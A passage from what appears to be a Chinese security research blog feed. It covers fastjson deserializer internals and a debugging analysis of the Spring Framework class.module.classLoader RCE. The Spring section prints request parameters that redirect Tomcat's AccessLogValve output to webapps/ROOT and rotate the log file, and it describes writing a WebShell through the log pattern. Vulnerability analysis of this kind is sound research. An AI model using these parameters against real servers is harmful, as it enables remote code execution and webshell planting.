&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><pre><code>  - `Method`的一系列判断，是否大于4，是否不是静态方法，返回类型是否为void或是否为当前类的类型  - 获取`Method`的参数的类型，如果参数类型的数组等于1，     - 获取参数的类的注解及父类的注解`method.getAnnotation(JSONField.class)`，如果不为空，且判断annotation.deserialize()</code></pre><p>是否为false，则继续循环</p><pre><code>  - 判断方法名是否为`set`开头，且第三个字符是否为大写及是否小于`512`，如果不是大写，判断是否为`_`，如果不是`_`，继续判断是否是`f`，如果都不是，继续判断`MethodName`是否小于`5`，第四个字符是否是大写  - `propertyName = Character.toLowerCase(methodName.charAt(3)) + methodName.substring(4);`  - 通过`propertyName`获取对应的`Field`  - 如果`field`为空且字段类型是`Boolean`  - 同样判断一下`field`是否有`Annotation`  - 向添加`fieldList`中添加`FieldInfo(propertyName, method, field, clazz, type, ordinal, serialzeFeatures, parserFeatures, annotation, fieldAnnotation, (String)null);`，实例化`FieldInfo`的过程中，会完成一些操作，比如`Field`修改可访问属性，因此私有的`Field`也可以使用  - 又获取了Methods，是这样的判断条件，     - 大于4     - 不是静态方法     - 以`get`开头     - 第三个字符大写     - 不带参数     - 返回类型是不是`Collection.class`、`Map.class`、`AtomicBoolean.class`、`AtomicInteger.class`、`AtomicLong.class`  - 返回实例化的`JavaBeanInfo`</code></pre><ul><li><p>判断字段数量不能大于200</p></li><li><p>遍历字段，判断字段类型对应的类是否为<code>Public</code>，这里是不需要为Public，比如<code>private String name;</code></p><ul><li>是否不是<code>Public</code>修饰符</li><li>是否为<code>Member</code>类</li><li>是否是枚举类型<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">methodName.length() &gt;= <span class="number">4</span> &amp;&amp; !Modifier.isStatic(method.getModifiers()) &amp;&amp; methodName.startsWith(<span class="string">&quot;get&quot;</span>) &amp;&amp; Character.isUpperCase(methodName.charAt(<span class="number">3</span>)) &amp;&amp; method.getParameterTypes().length == <span class="number">0</span> &amp;&amp; (Collection.class.isAssignableFrom(method.getReturnType()) || Map.class.isAssignableFrom(method.getReturnType()) || AtomicBoolean.class == method.getReturnType() || AtomicInteger.class == method.getReturnType() || AtomicLong.class == method.getReturnType())</span><br></pre></td></tr></table></figure><div align=center><img src="/img/fastjson序列化和反序列化/18.png" alt="18" style="zoom:50%;" /></div></li></ul></li><li><p>此时返回<code>this.asmFactory.createJavaBeanDeserializer(this, beanInfo);</code></p></li><li><p>判断<code>Clazz</code>是否为基本类型，比如int，如果是抛出异常</p></li><li><p>创建一个类，类名格式：<code>FastjsonASMDeserializer_1_User</code>，全称：<code>com.alibaba.fastjson.parser.deserializer.FastjsonASMDeserializer_1_User</code></p></li><li><p>创建<code>ClassWriter()</code>，可以看出通过<code>defineClassPublic</code>创建这个类；最终通过ASM创建了一个JavaBeanDeserializer类型的类，将config和beanInfo传入构造方法</p></li><li><p>将<code>type</code>和<code>derializer</code>映射关系放入<code>derializers</code>中，估计是留着备用</p></li></ul><p></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ObjectDeserializer <span class="title">createJavaBeanDeserializer</span><span class="params">(ParserConfig config, JavaBeanInfo beanInfo)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    Class&lt;?&gt; clazz = beanInfo.clazz;</span><br><span class="line">    <span class="keyword">if</span> (clazz.isPrimitive()) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;not support type :&quot;</span> + clazz.getName());</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        String className = <span class="string">&quot;FastjsonASMDeserializer_&quot;</span> + <span class="keyword">this</span>.seed.incrementAndGet() + <span class="string">&quot;_&quot;</span> + clazz.getSimpleName();</span><br><span class="line">        String packageName = ASMDeserializerFactory.class.getPackage().getName();</span><br><span class="line">        String classNameType = packageName.replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>) + <span class="string">&quot;/&quot;</span> + className;</span><br><span class="line">        String classNameFull = packageName + <span class="string">&quot;.&quot;</span> + className;</span><br><span class="line">        ClassWriter cw = <span class="keyword">new</span> ClassWriter();</span><br><span class="line">        cw.visit(<span class="number">49</span>, <span class="number">33</span>, classNameType, ASMUtils.type(JavaBeanDeserializer.class), (String[])<span class="keyword">null</span>);</span><br><span class="line">        <span class="keyword">this</span>._init(cw, <span class="keyword">new</span> ASMDeserializerFactory.Context(classNameType, config, beanInfo, <span class="number">3</span>));</span><br><span class="line">        <span class="keyword">this</span>._createInstance(cw, <span class="keyword">new</span> ASMDeserializerFactory.Context(classNameType, config, beanInfo, <span class="number">3</span>));</span><br><span class="line">        <span class="keyword">this</span>._deserialze(cw, <span class="keyword">new</span> ASMDeserializerFactory.Context(classNameType, config, beanInfo, <span class="number">5</span>));</span><br><span class="line">        <span class="keyword">this</span>._deserialzeArrayMapping(cw, <span class="keyword">new</span> ASMDeserializerFactory.Context(classNameType, config, beanInfo, <span class="number">4</span>));</span><br><span class="line">        <span class="keyword">byte</span>[] code = cw.toByteArray();</span><br><span class="line">        Class&lt;?&gt; exampleClass = <span class="keyword">this</span>.defineClassPublic(classNameFull, code, <span class="number">0</span>, code.length);</span><br><span class="line">        Constructor&lt;?&gt; constructor = exampleClass.getConstructor(ParserConfig.class, JavaBeanInfo.class);</span><br><span class="line">        Object instance = constructor.newInstance(config, beanInfo);</span><br><span class="line">        <span class="keyword">return</span> (ObjectDeserializer)instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-2-4-com-alibaba-fastjson-parser-deserializer"><a href="#2-2-4-com-alibaba-fastjson-parser-deserializer" class="headerlink" title="2.2.4  com.alibaba.fastjson.parser.deserializer#"></a>2.2.4  com.alibaba.fastjson.parser.deserializer#</h4><p>获取<code>deserializer</code>后，调用<code>deserializer.deserialze((DefaultJSONParser)this, clazz, fieldName);</code><br>此时再跟踪已经跟踪不了了，因为执行<code>deserialze</code>方法的是 创建的<code>FastjsonASMDeserializer_1_User</code>对象，这个对象我们跟踪不到；<br>这个对象对应的类是 <code>com.alibaba.fastjson.parser.deserializer#deserialze</code></p><ol><li>只能暂时静态分析，在循环获取字符串中<code>key</code>的过程中，如果仍然遇到<code>@type</code>，继续获取<code>deserizer.deserialze</code>方法进行解析</li></ol><center align=center><img src="/img/fastjson序列化和反序列化/19.png" alt="19" style="zoom:50%;" /></center><img src="/img/fastjson序列化和反序列化/20.png" alt="20" style="zoom:50%;" /><h4 id="2-2-5-参数赋值"><a href="#2-2-5-参数赋值" class="headerlink" title="2.2.5 参数赋值"></a>2.2.5 参数赋值</h4><p>这里根据<code>JavaBeanDeserializer</code>的构造方法得知，<code>fieldDeser</code>对应的是<code>DefaultFieldDeserializer</code>类型</p><ul><li>赋值的流程是 <code>DefaultFieldDeserializer#parseField()</code>方法 -&gt; <code>FieldDeserializer#setValue</code><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setValue</span><span class="params">(Object object, Object value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (value == <span class="keyword">null</span> <span class="comment">//</span></span><br><span class="line">        &amp;&amp; fieldInfo.fieldClass.isPrimitive()) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Method method = fieldInfo.method;</span><br><span class="line">        <span class="keyword">if</span> (method != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (fieldInfo.getOnly) &#123;</span><br><span class="line">                <span class="keyword">if</span> (fieldInfo.fieldClass == AtomicInteger.class) &#123;</span><br><span class="line">                    AtomicInteger atomic = (AtomicInteger) method.invoke(object);</span><br><span class="line">                    <span class="keyword">if</span> (atomic != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        atomic.set(((AtomicInteger) value).get());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (fieldInfo.fieldClass == AtomicLong.class) &#123;</span><br><span class="line">                    AtomicLong atomic = (AtomicLong) method.invoke(object);</span><br><span class="line">                    <span class="keyword">if</span> (atomic != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        atomic.set(((AtomicLong) value).get());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (fieldInfo.fieldClass == AtomicBoolean.class) &#123;</span><br><span class="line">                    AtomicBoolean atomic = (AtomicBoolean) method.invoke(object);</span><br><span class="line">                    <span class="keyword">if</span> (atomic != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        atomic.set(((AtomicBoolean) value).get());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Map.class.isAssignableFrom(method.getReturnType())) &#123;</span><br><span class="line">                    Map map = (Map) method.invoke(object);</span><br><span class="line">                    <span class="keyword">if</span> (map != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        map.putAll((Map) value);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    Collection collection = (Collection) method.invoke(object);</span><br><span class="line">                    <span class="keyword">if</span> (collection != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        collection.addAll((Collection) value);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                method.invoke(object, value);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">final</span> Field field = fieldInfo.field;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (fieldInfo.getOnly) &#123;</span><br><span class="line">                <span class="keyword">if</span> (fieldInfo.fieldClass == AtomicInteger.class) &#123;</span><br><span class="line">                    AtomicInteger atomic = (AtomicInteger) field.get(object);</span><br><span class="line">                    <span class="keyword">if</span> (atomic != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        atomic.set(((AtomicInteger) value).get());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (fieldInfo.fieldClass == AtomicLong.class) &#123;</span><br><span class="line">                    AtomicLong atomic = (AtomicLong) field.get(object);</span><br><span class="line">                    <span class="keyword">if</span> (atomic != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        atomic.set(((AtomicLong) value).get());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (fieldInfo.fieldClass == AtomicBoolean.class) &#123;</span><br><span class="line">                    AtomicBoolean atomic = (AtomicBoolean) field.get(object);</span><br><span class="line">                    <span class="keyword">if</span> (atomic != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        atomic.set(((AtomicBoolean) value).get());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (Map.class.isAssignableFrom(fieldInfo.fieldClass)) &#123;</span><br><span class="line">                    Map map = (Map) field.get(object);</span><br><span class="line">                    <span class="keyword">if</span> (map != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        map.putAll((Map) value);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    Collection collection = (Collection) field.get(object);</span><br><span class="line">                    <span class="keyword">if</span> (collection != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        collection.addAll((Collection) value);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (field != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    field.set(object, value);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">&quot;set property error, &quot;</span> + fieldInfo.name, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><strong><em>实际是通过遍历</em></strong><code>fieldInfo</code><strong><em>进行赋值，如果有</em></strong><code>setXXX</code><strong><em>方法，则通过反射调用，如果没有则通过反射对响应的</em></strong><code>Field</code><strong><em>进行赋值</em></strong></p><div align=center><img src="/img/fastjson序列化和反序列化/21.png" alt="21" style="zoom: 50%;" /></div><p>最终返回了一个实例化的Object对象</p>]]></content>
      
      
      <categories>
          
          <category> 攻防研究 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞分析 - fastjson </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Framework RCE分析</title>
      <link href="/2022/04/02/Spring%20Framework%20RCE%E5%88%86%E6%9E%90/"/>
      <url>/2022/04/02/Spring%20Framework%20RCE%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>&emsp;&emsp;因为第一次调试spring框架，首先分析spring的参数绑定，从预警和后来的poc来看，和spring的参数绑定有关系</p><h2 id="0x02参数绑定流程"><a href="#0x02参数绑定流程" class="headerlink" title="0x02参数绑定流程"></a>0x02参数绑定流程</h2><p>&emsp;&emsp;先记录几个单词的意思</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Handler:    [&#39;hændlə] 处理者、处理程序</span><br><span class="line">Disptacher: [dis&#39;pætʃə] 调度员、调度程序</span><br><span class="line">Mapping:    [&#39;mæpiŋ] 映射</span><br><span class="line">Adapter:    [ə&#39;dæptə]  适配器</span><br><span class="line">Argument:   [&#39;ɑ:ɡjumənt] 逻辑论证</span><br></pre></td></tr></table></figure><h3 id="1-Spring运行流程图"><a href="#1-Spring运行流程图" class="headerlink" title="1. Spring运行流程图"></a>1. Spring运行流程图</h3><img src="/img/Spring Framework RCE分析/image-20220403000622503.png" alt="image-20220403000622503" style="zoom: 33%;" /><h3 id="2-统一调度方法"><a href="#2-统一调度方法" class="headerlink" title="2. 统一调度方法"></a>2. 统一调度方法</h3><p>&emsp;&emsp;先找到统一的调度器方法，并设置断点org/springframework/web/servlet/DispatcherServlet.class#doDispatch()<br>图中三个断点位置</p><ul><li>第一个<code>this.checkMultipart()</code> ，这里看到就断下来了，我记得之前有个漏洞好像和这个有关系。判断是否是上传包</li><li>第二个断点是<code>HandlerAdapter</code>的初始化；这里看到下面还有一个判断是否是Get或HEAD方法，并判断是否支持这个方法</li><li>第三个断点即进入<code>HandlerAdapter</code>的处理方法，HandlerAdapter.handle</li></ul><img src="/img/Spring Framework RCE分析/image-20220403000650938.png" alt="image-20220403000650938" style="zoom: 50%;" /><h3 id="3-处理适配器的处理方法"><a href="#3-处理适配器的处理方法" class="headerlink" title="3. 处理适配器的处理方法"></a>3. 处理适配器的处理方法</h3><p>&emsp;&emsp;步入上面ha.handle()的处理方法中，通过<code>this.invokeHandlerMethod()</code>方法获取熟悉的ModelAndView对象</p><img src="/img/Spring Framework RCE分析/image-20220403000717238.png" alt="image-20220403000717238" style="zoom: 50%;" /><h3 id="4-调用与处理"><a href="#4-调用与处理" class="headerlink" title="4. 调用与处理"></a>4. 调用与处理</h3><p>&emsp;&emsp;继上一步，进入org/springframework/web/servlet/mvc/method/annotation/RequestMappingHandlerAdapter.invokeHandlerMethod ，图中断点位置进入<code>invokeAndHandle</code>（调用和处理）方法，断点前是一些ModelAndViewContainer和AsyncWebRequest对象的初始化</p><img src="/img/Spring Framework RCE分析/image-20220403000749580.png" alt="image-20220403000749580" style="zoom:50%;" /><p>&emsp;&emsp;接着进入invokeAndHandle方法后，首先执行的就是<code>invokeForRequest</code></p><p>![image-20220403000808200](/img/Spring Framework RCE分析/image-20220403000808200.png)</p><p>&emsp;&emsp;下一步进入invokeForRequest方法，这里从字面上可以看出下一步是获取方法的值<code>（this.getMethodArgumentValues）</code></p><img src="/img/Spring Framework RCE分析/image-20220403000823543.png" alt="image-20220403000823543" style="zoom:50%;" /><h3 id="5-进入参数绑定"><a href="#5-进入参数绑定" class="headerlink" title="5. 进入参数绑定"></a>5. 进入参数绑定</h3><p>a. 进入上一步的 <code>getMethodArgumentValues()</code> 在<code>this.resolvers.resolveArgument</code> 方法设置断点</p><img src="/img/Spring Framework RCE分析/image-20220403000839778.png" alt="image-20220403000839778" style="zoom: 50%;" /><p>b. 进入该方法，执行到</p><p>org/springframework/web/method/annotation/ModelAttributeMethodProcessor#resolveArgument 在图中断点位置，可以看到<code>bindRequestParameters()</code>，可以把它理解为”绑定请求参数”</p><img src="/img/Spring Framework RCE分析/image-20220403000911356.png" alt="image-20220403000911356" style="zoom:50%;" /><p>c. 指定到DataBinder#doBind()方法，进入<code>this.applyPropertyValues()</code></p><img src="/img/Spring Framework RCE分析/image-20220403000954194.png" alt="image-20220403000954194" style="zoom:50%;" /><img src="/img/Spring Framework RCE分析/image-20220403001037708.png" alt="image-20220403001037708" style="zoom:50%;" /><p>d. 跟入<code>setPropertyValue </code>方法，可以看到nestedPa是一个封装了Object[POJO.Student]的BeanWrapperImpl对象</p><img src="/img/Spring Framework RCE分析/image-20220403001137387.png" alt="image-20220403001137387" style="zoom:50%;" /><h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>  &emsp;&emsp;这里笔记分割的比较突然，主要是因为下面的流程就慢慢和漏洞有关联</p><h3 id="1-参数名的分割处理"><a href="#1-参数名的分割处理" class="headerlink" title="1. 参数名的分割处理"></a>1. 参数名的分割处理</h3><p>a. 先是接上上面参数绑定的执行流程中，<code>setPropertyValue</code>方法，如图所示通过</p><img src="/img/Spring Framework RCE分析/image-20220403001152332.png" alt="image-20220403001152332" style="zoom:50%;" /><p>b. 通过PropertyAccessorUtils.getFirstNestedPropertySeparatorIndex(propertyPath) 计算pos为5，查看getFirstNestedPropertySeparatorIndex计算的方法，这里是计算第一个字符到第一个. 中间字符的个数，再进行分割，如class.x pos就是5，去除class</p><ul><li><p>关键位置还是<code>this.getNestedPropertyAccessor(nestedProperty)</code>在循环处理</p><img src="/img/Spring Framework RCE分析/image-20220403001209942.png" alt="image-20220403001209942" style="zoom:50%;" /></li></ul><h3 id="2-参数绑定的意外情况"><a href="#2-参数绑定的意外情况" class="headerlink" title="2. 参数绑定的意外情况"></a>2. 参数绑定的意外情况</h3><ul><li>继续调试，在参数绑定的流程中，发现除了当前POJO对象的一些字段以外，多了一个class字段</li><li>这里为了防止混淆，重新提交<code>id.x=666&amp;name=nine</code>这样类型的参数，继续调试，进入<code>getNestedPropertyAccessor</code>方法</li></ul><p>a. 继续步入，程序通过getPropertyValue获取一个Object，tokens在前面是nestedProperty的格式化效验，也就是参数中的id</p><img src="/img/Spring Framework RCE分析/image-20220403001226852.png" alt="image-20220403001226852" style="zoom:50%;" /><p>b. 进入该方法，指定到<code>getLocalPropertyHandler</code>，关注一下这段代码的执行</p><img src="/img/Spring Framework RCE分析/image-20220403001303500.png" alt="image-20220403001303500" style="zoom:50%;" /><ul><li>getPropertyDescriptor 这个地方可以画重点了，这里可以看到，获取<code>propertyDescriptorCache </code>这个Map对象中的值，key对应这POJO中的字段，但是这里多了一个<code>class</code>键值对。</li></ul><img src="/img/Spring Framework RCE分析/image-20220403001419499.png" alt="image-20220403001419499" style="zoom:50%;" /><p>​    带着class这个键值对的疑惑，回到上一步CachedIntrospectionResults 中，可以看到strongClassCache 中每一个Value对象的<code>propertyDescriptorCache</code>都带有这个class键值对</p><img src="/img/Spring Framework RCE分析/image-20220403001419499.png" alt="image-20220403001419499" style="zoom:50%;" /><h3 id="3-发送class-x参数重新调试"><a href="#3-发送class-x参数重新调试" class="headerlink" title="3. 发送class.x参数重新调试"></a>3. 发送class.x参数重新调试</h3><ul><li>此时在post包中输入class.x=test参数调试进一步分析</li></ul><p>a. 在获取了getPropertyValue()即POJO.Student后，回到getNestedPropertyAccessor 方法，继续执行到<code>this.newNestedPropertyAccessor(value, this.nestedPath + canonicalName + &quot;.&quot;);</code></p><img src="/img/Spring Framework RCE分析/image-20220403001448066.png" alt="image-20220403001448066" style="zoom:50%;" /><p>b. 实例化 newNestedPropertyAccessor 方法，赋值给nestedPa，并再次进入PropertyAccessorUtils.getFirstNestedPropertySeparatorIndex(propertyPath) 的循环调用中，<code>new newNestedPropertyAccessor</code>实例化的一个新对象是包装java.lang.Class的BeanWrapperImpl类</p><img src="/img/Spring Framework RCE分析/image-20220403001504964.png" alt="image-20220403001504964" style="zoom:50%;" /><p>c. 可以看到之前的循环处理x.x.x.x参数名的代码，新的nestedPath，继续调用<code>getFirstNestedPropertySeparatorIndex(propertyPath)</code> 方法</p><img src="/img/Spring Framework RCE分析/image-20220403001525042.png" alt="image-20220403001525042" style="zoom:50%;" /><pre><code> 分析到这里，已经可以发现spring在参数绑定时，对于正常的参数和x.x=aaa这种参数的不同处理</code></pre><h3 id="04-JDK与Bypass"><a href="#04-JDK与Bypass" class="headerlink" title="04. JDK与Bypass"></a>04. JDK与Bypass</h3><p>​    回头看一下CVE-2010-1622发现看的顺畅多了，但是class.classloader用不了了，这里切换到jdk8，在包装对象转换流程中看一下，发现JDK9+多了一个module属性。</p><ul><li><p>JDK8.x获取到的class</p><img src="/img/Spring Framework RCE分析/image-20220403001541124.png" alt="image-20220403001541124" style="zoom:50%;" /><ul><li><p>JDK9+</p><img src="/img/Spring Framework RCE分析/image-20220403001557353.png" alt="image-20220403001557353" style="zoom:50%;" /></li></ul></li></ul><p>​    Class.module是JDK9+后的新特性，JPMS模块化，暂时理解是将以前的classpath的这种统一调用的方法，可扩展为模块化调用</p><h2 id="0x03-利用链构造"><a href="#0x03-利用链构造" class="headerlink" title="0x03 利用链构造"></a>0x03 利用链构造</h2><p>a. 首先在strongClassCache中看一下Class类的propertyDescriptoCache有哪些可以调用的<code>GenericTypeAwarePropertyDescriptor</code>对象</p><img src="/img/Spring Framework RCE分析/image-20220403001616324.png" alt="image-20220403001616324" style="zoom:50%;" /><p>b. 使用<code>class.module.x=test</code>作为参数，请求，在nestedPa这个地方，获取了类型为java.lang.Module的包装类</p><img src="/img/Spring Framework RCE分析/image-20220403001634997.png" alt="image-20220403001634997" style="zoom:50%;" /><p>c. 继续构造class.module.x.x，打开propertyDescriptoCache，看到了<code>classLoader</code></p><img src="/img/Spring Framework RCE分析/image-20220403001653551.png" alt="image-20220403001653551" style="zoom:50%;" /><p>d. 这里也就对应<code>java.lang.Module</code>类中，成员的get方法</p><img src="/img/Spring Framework RCE分析/image-20220403001715044.png" alt="image-20220403001715044" style="zoom:50%;" /><p>e. 这里获取的classLoader是tomcat的类加载器<code>org.apache.catalina.loader.ParallelWebappClassLoader</code>类</p><p>org.springframework.beans.BeanWrapperImpl: wrapping object [org.apache.catalina.loader.ParallelWebappClassLoader@71d41616]</p><img src="/img/Spring Framework RCE分析/image-20220403001733958.png" alt="image-20220403001733958" style="zoom:50%;" /><p>f.参考S2-020在tomcat8中的利用链思路</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">tomcat中的利用链</span><br><span class="line">org.apache.catalina.loader.ParallelWebappClassLoader</span><br><span class="line">  org.apache.catalina.webresources.StandardRoot</span><br><span class="line">    org.apache.catalina.core.StandardContext</span><br><span class="line">      org.apache.catalina.core.StandardHost</span><br><span class="line">        org.apache.catalina.core.StandardPipeline</span><br><span class="line">          org.apache.catalina.valves.AccessLogValve</span><br></pre></td></tr></table></figure><img src="/img/Spring Framework RCE分析/image-20220403001757430.png" alt="image-20220403001757430" style="zoom:50%;" /><p>​    最终的payload也是通过操作tomcat启动后<code>AccessLogValve</code>的对象，指定日志输出位置，并填充日志内容，写入WebShell</p><h3 id="01-相对路径问题"><a href="#01-相对路径问题" class="headerlink" title="01 相对路径问题"></a>01 相对路径问题</h3><pre><code> 这里在debug的时候总是写不到相对目录，后来在调试过程中，发现idea直接部署的项目会临时将配置放在一个缓存路径下，而真实的tomcat部署的项目，可以直接通过webapps/ROOT使用相对路径</code></pre><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">class.module.classLoader.resources.context.parent.pipeline.first.directory&#x3D;webapps&#x2F;ROOT</span><br></pre></td></tr></table></figure><img src="/img/Spring Framework RCE分析/image-20220403001813935.png" alt="image-20220403001813935" style="zoom:50%;" /><p>​    AccessLogValve中会新建日志文件及路径涉及的文件夹，也就是说指定webapps/自定义一个文件夹就可以，不需要必须有ROOT</p><img src="/img/Spring Framework RCE分析/image-20220403001830287.png" alt="image-20220403001830287" style="zoom:50%;" /><pre><code> AccessLogValve 在getLogFile中会新建目录</code></pre><img src="/img/Spring Framework RCE分析/image-20220403001849265.png" alt="image-20220403001849265" style="zoom:50%;" /><h3 id="02-多次上传的问题"><a href="#02-多次上传的问题" class="headerlink" title="02. 多次上传的问题"></a>02. 多次上传的问题</h3><p>​    第一次发包文件落地后，第二次发包，默认是不新建文件的，这个时候通过指定fileDateFormat=3，tomcat会新建一个文件，文件格式是<code>prefix + fileDateFormat + suffix</code>，fileDateFormat需要满足格式，这里随便输入数字即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat&#x3D;1</span><br><span class="line">class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat&#x3D;2</span><br></pre></td></tr></table></figure><img src="/img/Spring Framework RCE分析/image-20220403001924129.png" alt="image-20220403001924129" style="zoom:50%;" /><h3 id="03-特殊符号的问题"><a href="#03-特殊符号的问题" class="headerlink" title="03. 特殊符号的问题"></a>03. 特殊符号的问题</h3><p>​        熟悉access日志的还记得tomcat在配置日志时，通过%h %l %u等获取tomcat解析http后的内置字段，因此pattern中的%会被解析</p><img src="/img/Spring Framework RCE分析/image-20220403002011555.png" alt="image-20220403002011555" style="zoom:50%;" /><p>​    因此需要通过<code>%&#123;headerName&#125;i</code>，获取自定义header字段，通过这种方式将%拼接在pattern中 </p><img src="/img/Spring Framework RCE分析/image-20220403002037838.png" alt="image-20220403002037838" style="zoom:50%;" /><h3 id="04-SpringBoot"><a href="#04-SpringBoot" class="headerlink" title="04. SpringBoot"></a>04. SpringBoot</h3><p>​    SpringBoot中通过class → module → classLoader获取的是应用程序类加载器<code>AppClassLoader</code>；可继续使用的propertyDescriptors很有限，目前没有什么思路</p><img src="/img/Spring Framework RCE分析/image-20220403002059502.png" alt="image-20220403002059502" style="zoom:50%;" /><h2 id="0x04-阶段总结"><a href="#0x04-阶段总结" class="headerlink" title="0x04 阶段总结"></a>0x04 